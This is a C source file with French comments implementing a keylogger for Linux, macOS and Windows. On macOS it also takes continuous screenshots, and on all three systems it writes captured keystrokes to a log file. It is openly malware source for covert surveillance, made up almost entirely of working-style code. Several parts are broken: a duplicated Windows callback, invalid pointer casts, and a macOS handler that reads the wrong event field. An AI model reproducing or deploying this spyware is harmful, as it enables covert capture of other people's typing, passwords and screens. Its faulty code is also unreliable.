#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef __linux__

#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <dirent.h>

// Fonction pour enregistrer les événements de touches sur Linux
void keylogger(const char *file_path) {
    struct dirent *entry;
    DIR *dir = opendir("/dev/input");
    if (!dir) {
        perror("Failed to open /dev/input");
        return;
    }

    FILE *logfile = fopen(file_path, "a"); // Ouvre le fichier pour ajouter des logs
    if (!logfile) {
        perror("Failed to open log file");
        closedir(dir);
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (strstr(entry->d_name, "event") != NULL) {
            char device_path[512];
            snprintf(device_path, sizeof(device_path), "/dev/input/%s", entry->d_name);
            int fd = open(device_path, O_RDONLY);
            if (fd == -1) {
                perror("Failed to open input device");
                continue;
            }

            struct input_event ev;
            while (1) {
                ssize_t bytes = read(fd, &ev, sizeof(struct input_event));
                if (bytes == -1) {
                    perror("Failed to read input event");
                    break;
                }
                if (ev.type == EV_KEY && ev.value == 1) { // Key press event
                    fprintf(logfile, "%d : %s\n", ev.code, device_path);
                }
            }
            close(fd);
        }
    }

    fclose(logfile); // Ferme le fichier à la fin
    closedir(dir);
}

#endif

#ifdef __APPLE__
#include <ApplicationServices/ApplicationServices.h>
#include <CoreGraphics/CoreGraphics.h>
#include <ApplicationServices/ApplicationServices.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

// Gestionnaire d'événements pour macOS
CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *userInfo) {
    if (type == kCGEventKeyDown) {
        int keyCode = CGEventGetIntegerValueField(event, kCGEventSourceStateID);
        FILE *logfile = (FILE *)userInfo; // Récupère le fichier passé en argument
        fprintf(logfile, "Key pressed: %d\n", keyCode); // Enregistre la touche dans le fichier
    }
    return event;
}

// Fonction pour démarrer le keylogger sur macOS
void start_keylogger(const char *file_path) {
    FILE *logfile = fopen(file_path, "a"); // Ouvre le fichier pour ajouter des logs
    if (!logfile) {
        printf("Failed to open log file\n");
        return;
    }

    CFMachPortRef eventTap = CGEventTapCreate(kCGEventTapEventTap, kCGEventTapOptionDefault, kCGEventTapEventTap, kCGEventKeyDown, event_handler, logfile);
    if (!eventTap) {
        printf("Failed to create event tap\n");
        fclose(logfile);
        return;
    }

    CFRunLoopRef runLoop = CFRunLoopGetCurrent();
    CFRunLoopAddSource(runLoop, CFMachPortCreateRunLoopSource(NULL, eventTap, 0), kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);
    CFRunLoopRun();

    fclose(logfile); // Ferme le fichier une fois le keylogger terminé
}

void save_image(CGImageRef image, const char *filename) {
    CFURLRef url = CFURLCreateWithFileSystemPath(NULL, CFStringCreateWithCString(NULL, filename, kCFStringEncodingUTF8), kCFURLPOSIXPathStyle, false);
    CGImageDestinationRef dest = CGImageDestinationCreateWithURL(url, kUTTypePNG, 1, NULL);
    CGImageDestinationAddImage(dest, image, NULL);
    CGImageDestinationFinalize(dest);
    CFRelease(url);
    CFRelease(dest);
}

void capture_screen_at_fps(int target_fps, const char *output_directory) {
    clock_t last_capture_time = clock();
    int target_delay = CLOCKS_PER_SEC / target_fps;
    int image_counter = 0;

    while (1) {
        clock_t current_time = clock();
        int time_diff = current_time - last_capture_time;

        // Si le temps écoulé est plus grand que le délai cible, on capture
        if (time_diff >= target_delay) {
            // Capture de l'écran
            CGImageRef image = CGDisplayCreateImage(kCGDirectMainDisplay);
            if (image != NULL) {
                // Crée un nom de fichier unique basé sur le compteur d'image
                char filename[1024];
                snprintf(filename, sizeof(filename), "%s/screenshot_%d.png", output_directory, image_counter);

                // Sauvegarde l'image dans le dossier spécifié
                save_image(image, filename);
                printf("Image sauvegardée : %s\n", filename);

                CFRelease(image);
                image_counter++; // Incrémenter le compteur d'images
            }

            last_capture_time = current_time; // Réinitialise l'heure de la dernière capture
        }
    }
}

#endif

#ifdef __WIN32__

#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>

// Callback pour le hook clavier sous Windows
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN) {
            FILE *logfile = (FILE *)kbd->dwExtraInfo; // Récupère le fichier passé en argument
            fprintf(logfile, "Key pressed: %ld\n", kbd->vkCode); // Enregistre la touche dans le fichier
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Fonction pour obtenir l'heure en secondes depuis l'époque Unix (UTC)
char* get_current_time() {
    time_t now;
    time(&now);
    struct tm *gmt = gmtime(&now); // Obtient l'heure UTC
    static char time_str[20];
    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", gmt); // Format "YYYY-MM-DD HH:MM:SS"
    return time_str;
}

// Fonction de callback pour gérer la pression des touches
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Si c'est une pression de touche (WM_KEYDOWN)
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        FILE *logfile = (FILE*)GetKeyState(0); // Récupère le pointeur du fichier passé

        // Obtenir le temps actuel au format UTC
        char *current_time = get_current_time();

        // Enregistre la touche pressée et l'horodatage dans le fichier
        fprintf(logfile, "%s: %c\n", current_time, pKeyboard->vkCode);
        fflush(logfile); // Force l'écriture immédiate dans le fichier
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam); // Permet la propagation de l'événement
}

// Fonction pour démarrer le keylogger sous Windows
void start_keylogger(const char *file_path) {
    FILE *logfile = fopen(file_path, "a"); // Ouvre le fichier pour ajouter des logs
    if (!logfile) {
        printf("Failed to open log file\n");
        return;
    }

    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hook == NULL) {
        printf("Failed to install hook\n");
        fclose(logfile);
        return;
    }

    // Passer le fichier en argument en utilisant dwExtraInfo
    SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    KBDLLHOOKSTRUCT kbdInfo;
    kbdInfo.dwExtraInfo = (ULONG_PTR)logfile; // Passer le fichier à la fonction de callback

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    fclose(logfile); // Ferme le fichier après l'exécution du keylogger
}

#endif
